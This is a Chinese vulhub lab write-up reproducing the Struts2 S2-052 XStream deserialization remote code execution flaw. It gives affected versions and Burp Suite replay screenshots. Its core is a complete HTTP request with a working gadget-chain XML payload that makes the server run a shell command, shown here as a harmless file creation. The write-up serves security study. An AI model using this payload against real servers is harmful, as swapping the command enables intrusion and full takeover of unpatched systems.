# Struts2_052_远程代码执行

###### by ADummy

### 0x00利用路线

​			burpuite抓包--->修改payload--->重放包--->代码执行

### 0x01漏洞介绍

​			Struts2 REST插件的XStream组件存在反序列化漏洞，使用XStream组件对XML格式的数据包进行反序列化操作时，未对数据内容进行有效验证，存在安全隐患，可被远程攻击。

​			影响版本

  		2.1.2 - 2.3.33      2.5 - 2.5.12

### 0x02漏洞复现

#### payload1(RCE)：

POST /orders/3/edit HTTP/1.1 Host: your-ip:8080 Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Content-Type: application/xml Content-Length: 2415  <map>   <entry>     <jdk.nashorn.internal.objects.NativeString>       <flags>0</flags>       <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">         <dataHandler>           <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">             <is class="javax.crypto.CipherInputStream">               <cipher class="javax.crypto.NullCipher">                 <initialized>false</initialized>                 <opmode>0</opmode>                 <serviceIterator class="javax.imageio.spi.FilterIterator">                   <iter class="javax.imageio.spi.FilterIterator">                     <iter class="java.util.Collections$EmptyIterator"/>                     <next class="java.lang.ProcessBuilder">                       <command>                         **<string>touch</string>                         <string>/tmp/success</string>**                       </command>                       <redirectErrorStream>false</redirectErrorStream>                     </next>                   </iter>                   <filter class="javax.imageio.ImageIO$ContainsFilter">                     <method>                       <class>java.lang.ProcessBuilder</class>                       <name>start</name>                       <parameter-types/>                     </method>                     <name>foo</name>                   </filter>                   <next class="string">foo</next>                 </serviceIterator>                 <lock/>               </cipher>               <input class="java.lang.ProcessBuilder$NullInputStream"/>               <ibuffer></ibuffer>               <done>false</done>               <ostart>0</ostart>               <ofinish>0</ofinish>               <closed>false</closed>             </is>             <consumed>false</consumed>           </dataSource>           <transferFlavors/>         </dataHandler>         <dataLen>0</dataLen>       </value>     </jdk.nashorn.internal.objects.NativeString>     <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/>   </entry>   <entry>     <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>     <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>   </entry> </map>



​			**访问struts2-rest-showcase界面**

![S2_052_rce_1](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/S2_052_rce_1.jpg)

​			**Burpsuite重放，代码成功执行**

![S2_052_rce_2](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/S2_052_rce_2.jpg)

​			**进入docker，发现success文件被创建**

![S2_052_rce_3](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/S2_052_rce_3.jpg)



### 0x03参考资料

https://blog.csdn.net/qq_29647709/article/details/84954575
